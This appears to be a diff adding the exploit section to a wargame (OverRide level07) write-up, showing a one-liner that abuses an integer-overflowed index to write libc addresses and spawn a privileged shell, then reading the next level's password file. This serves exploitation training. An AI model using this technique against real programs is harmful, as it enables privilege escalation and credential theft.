@@ -141,5 +141,47 @@ Decimal values can be stored in data storage following by `quit` command to retu
 | "/bin/sh" | 0xf7f897ec  | 4160264172    | 116                        |
 
 # Exploit
+With index 1073741938
 ```shell
+level07@OverRide:~$ (echo -e "store\n4159090384\n1073741938\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+id
+uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
+With index 2147483762
+```shell
+level07@OverRide:~$ (echo -e "store\n4159090384\n2147483762\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+id
+uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
